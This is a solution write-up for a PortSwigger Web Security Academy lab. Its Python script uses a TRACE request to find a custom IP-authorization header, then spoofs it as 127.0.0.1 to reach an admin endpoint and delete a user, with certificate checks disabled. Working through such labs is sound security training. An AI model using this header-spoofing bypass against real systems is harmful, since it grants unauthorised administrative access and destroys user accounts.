# Lab: Authentication bypass via information disclosure

Link to lab: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0ae90081043828a9c1b80ebc00f800d7.web-security-academy.net/'

response =  requests.request('TRACE', url)

# request with trace method to get all the name of headers we are received -> X-Custom-IP-Authorization:


headers = {
    'X-Custom-Ip-Authorization': '127.0.0.1',
}

response = requests.get(
    'https://0ae90081043828a9c1b80ebc00f800d7.web-security-academy.net/admin/delete?username=carlos',
    headers=headers,
    verify=False,
)
print(response.text)
```